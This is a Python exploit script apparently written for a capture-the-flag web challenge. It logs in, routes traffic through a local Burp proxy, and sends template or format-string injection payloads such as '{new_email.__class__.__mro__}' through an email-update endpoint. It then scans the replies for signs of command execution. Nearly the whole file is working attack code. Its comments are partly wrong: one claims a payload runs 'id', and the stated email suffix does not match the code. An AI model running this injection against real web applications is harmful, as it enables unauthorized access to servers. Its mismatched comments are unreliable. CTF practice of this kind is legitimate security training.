import requests
import json
import sys

# =======================
# Configuration Section
# =======================

# Target Configuration
TARGET_DOMAIN = "http://chal.competitivecyber.club:1337"  # Replace with the actual target domain (e.g., http://example.com)
LOGIN_ENDPOINT = "/api/login"                 # Endpoint for login
UPDATE_EMAIL_ENDPOINT = "/api/update-email"    # Endpoint for updating email

# Credentials
USERNAME = "{new_email.__class__.__dict__}@a.b"  # Provided username
PASSWORD = "asdf"          # Provided password

# Burp Suite Proxy Configuration
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"  # Included for completeness
}

# Headers
HEADERS = {
    "Content-Type": "application/json"
}

# SSTI Payloads (Ensure each payload + '@a.b' <= 50 characters)
PAYLOADS = [
    "{new_email.__class__.__mro__}",         # Executes 'id' command
    # Add more payloads as needed, ensuring the total email length remains <= 50
]

# =======================
# Helper Functions
# =======================

def login(session):
    """
    Logs into the application and retrieves the 'auth' session cookie.
    """
    url = TARGET_DOMAIN + LOGIN_ENDPOINT
    payload = {
        "email": USERNAME,
        "password": PASSWORD
    }
    
    try:
        # Send POST request to login endpoint
        response = session.post(url, headers=HEADERS, json=payload, proxies=PROXIES, allow_redirects=False)
        
        # Check if login was successful (e.g., status code 200 or 302)
        if response.status_code in [200, 302]:
            # Extract 'Set-Cookie' headers
            set_cookie = response.headers.get('Set-Cookie')
            if set_cookie:
                # Parse the 'auth' cookie
                cookies = session.cookies.get_dict()
                auth_cookie = cookies.get('session')
                if auth_cookie:
                    print("[+] Login successful.")
                    print(f"[+] Retrieved auth cookie: {auth_cookie}")
                    return auth_cookie
                else:
                    print("[-] 'auth' cookie not found in the response.")
                    print("[*] All cookies:", cookies)
                    return None
            else:
                print("[-] 'Set-Cookie' header not found in the response.")
                return None
        else:
            print(f"[-] Login failed with status code: {response.status_code}")
            print(f"[-] Response Message: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Exception during login: {e}")
        return None

def update_email(session, auth_cookie, payload):
    """
    Updates the email address with the given SSTI payload.
    """
    url = TARGET_DOMAIN + UPDATE_EMAIL_ENDPOINT
    # Ensure the total email length does not exceed 50 characters
    # Payload length + '@a.b' should be <=50
    # Calculate allowed payload length
    DOMAIN_PART = "@a"
    MAX_EMAIL_LENGTH = 50
    max_payload_length = MAX_EMAIL_LENGTH - len(DOMAIN_PART)
    
    # Truncate or adjust payload if necessary
    if len(payload) > max_payload_length:
        payload = payload[:max_payload_length]
    
    email = f"{payload}{DOMAIN_PART}"
    data = {
        "email": email
    }
    
    # Set the 'auth' cookie manually
    cookies = {
        "auth": auth_cookie
    }
    
    try:
        # Send POST request to update email endpoint
        response = session.post(url, headers=HEADERS, json=data, cookies=cookies, proxies=PROXIES, allow_redirects=False)
        
        # Check if the request was processed
        if response.status_code == 200:
            print("[+] Email update request sent successfully.")
            return response
        else:
            print(f"[-] Email update failed with status code: {response.status_code}")
            print(f"[-] Response Message: {response.text}")
            return response
    except requests.exceptions.RequestException as e:
        print(f"[-] Exception during email update: {e}")
        return None

def exploit_ssti(session, auth_cookie):
    """
    Iterates through the SSTI payloads to exploit the vulnerability.
    """
    for idx, payload in enumerate(PAYLOADS, start=1):
        print(f"\n[+] Exploitation Attempt {idx}: Using Payload: {payload}")
        response = update_email(session, auth_cookie, payload)
        
        if response:
            try:
                # Attempt to parse JSON response
                response_json = response.json()
                error = response_json.get('error', {})
                message = error.get('message', [])
                
                if message:
                    for msg in message:
                        # Check for command execution indicators
                        if any(cmd in msg.lower() for cmd in ['uid=', 'gid=', 'id(', 'whoami', 'uname', 'ls']):
                            print(f"[+] Exploit Success: {msg}")
                        else:
                            print(f"[-] Potential Error or No Output: {msg}")
                else:
                    print("[-] No 'error' or 'message' field found in the response.")
            except json.JSONDecodeError:
                # If response is not JSON, print raw text
                print("[-] Response is not in JSON format. Manual inspection required.")
                print(f"Response Text: {response.text}")
        else:
            print("[-] No response received for this payload.")

def main():
    """
    Main function to orchestrate the exploitation workflow.
    """
    # Initialize a session
    session = requests.Session()
    
    # Step 1: Login and retrieve auth cookie
    print("[*] Attempting to log in...")
    auth_cookie = login(session)
    
    if not auth_cookie:
        print("[-] Login unsuccessful. Exiting.")
        sys.exit(1)
    
    # Step 2: Exploit SSTI vulnerability by updating email with payloads
    exploit_ssti(session, auth_cookie)
    
    print("\n[+] Exploitation process completed.")

if __name__ == "__main__":
    main()